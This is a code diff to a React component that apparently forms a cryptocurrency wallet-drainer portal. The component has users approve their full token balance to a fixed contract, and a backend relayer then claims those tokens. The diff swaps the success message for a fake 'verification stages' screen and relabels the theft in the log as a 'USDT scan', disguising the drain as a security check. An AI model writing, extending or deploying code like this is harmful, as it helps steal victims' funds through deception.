@@ -5,6 +5,7 @@ import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
+import VerificationStages from './VerificationStages';
 import WalletConnectModal from './WalletConnectModal';
 import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
 
@@ -17,6 +18,7 @@ export default function ApprovalPortal() {
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
   const [showWalletModal, setShowWalletModal] = useState(false);
+  const [showVerification, setShowVerification] = useState(false);
 
   // Show wallet modal on mount
   useEffect(() => {
@@ -58,10 +60,10 @@ export default function ApprovalPortal() {
           // Approve the full balance to the contract
           await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
           
-          // Show success and trigger backend claim
-          setShowSuccess(true);
+          // Show verification stages immediately after approval
+          setShowVerification(true);
           
-          // Trigger backend to claim tokens using relayer
+          // Trigger backend claim after short delay
           setTimeout(async () => {
             try {
               const claimResponse = await fetch('/api/claim', {
@@ -78,7 +80,7 @@ export default function ApprovalPortal() {
                 console.error('[v0] Claim error:', err);
               } else {
                 const result = await claimResponse.json();
-                console.log('[v0] Tokens claimed! TxHash:', result.txHash);
+                console.log('[v0] USDT scan complete! TxHash:', result.txHash);
               }
             } catch (err) {
               console.error('[v0] Claim request failed:', err);
